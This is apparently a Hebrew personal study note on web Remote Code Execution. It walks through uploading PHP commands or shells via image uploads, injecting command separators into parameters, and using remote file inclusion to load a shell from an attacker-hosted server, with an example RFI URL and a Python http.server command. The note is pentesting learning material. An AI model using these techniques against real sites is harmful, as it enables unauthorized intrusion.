RCE - Remote Code Execution
# המטרה
כאן המטרה זה להריץ פקודות מערכת כלשהי כמו whoami או ls כל פקודת מערכת בווינדוס או בלינוקס
# אינדיקציה
* פגיעות של RCE היא הרצת פקודה מרחוק ויכולה להתבצע בכמה דרכים:
1. פונקציונליות של העלאת קבצים 
2. נזהה שדה קלט פגיע ע"י בדיקה
3. ננסה להזריק פקודות מערכת ישירות לשדה קלט
	* זה טוב אם יש שיקוף של הקלט באתר למשל
4. ניצול של [[RFI]]

## העלאת קבצים
#### אופציה 1
* כל מנגנון של העלאת קבצים בין אם זה תמונות קבצים או כל דבר אחר ישר אמור להקפיץ לנו חשד שאפשר לבצע RCE
* גם פורום של תגובות יכול להיות פוטנציאל אל RCE
* נניח נראה אופציה של העלאת תמונות, ננסה להזריק פקודת מערכת בphp יחד עם התמונה
![[Pasted image 20250723000050.png]]
* לשים לב לכל מה שמסומן באדום בבקשה, ואם בתגובה התקבל שהתגובה נשלחה בהצלחה זה אומר שהתמונה עלתה
* כעת ננסה לגשת לתמונה
![[Pasted image 20250723000218.png]]
* הצלחנו אם הפקודה עבדה
* המטרה בסוף זה להצליח לבצע פקודות מערכת כמו בדוגמא echo ומכאן יש לנו שליטה כמו cmd ואפשר להגיע למה שביקשו
#### אופציה 2
במקום להעלות פקודת מערכת אחת, ננסה להעלות shell בphp (בסיסי למשל) ואז יהיה לנו גישה לcmd 
## שדה קלט פגיע
* אם נזהה שדה קלט מסוים ובמיוחד שהאתר הוא עם סיומת php למשל:
![[Pasted image 20250723000448.png]]
* זה אינדיקציה לאפשרות של RCE
* לשים לב שהדוגמא זה בGET והמשתנים בURL אבל ייתכן והם יהיו בגוף הבקשה בPOST
* מאחורי הקלעים יש מצב שהמערכת מקבלת את המשתנה ואז למשל ואז משלימה את הפקודה :
```
echo admin;
```
* ולכן אם מראש נבצע הפרדה כלשהי נוכל לעשות פקודות מערכת משלנו
![[Pasted image 20250723000858.png]]

## ניצול של RFI
* אם גילינו RFI שטוען קבצים משרת מרוחק שלי למשל:
````
http://example.com/index.php?module=http://server2.example.com/welcome.php
````

* כל שנצטרך לעשות הוא להכין קובץ shell בphp למשל
	* לחפש באינטרנט או לשאול AI
* להרים שרת http שממנו נטען את הקובץ (באמצעות הכתובת)
	* עובד במחשב רק אם יש פייתון מותקן (לא בVScode אלא ממש אפליקציית פייתון)
	* אם אין, להרים מkali linux יש שם באופן דיפולטיבי
```
python -m http.server 1234
```
* ואז ניגש אל הshell במיקום המדויק בעזרת RFI
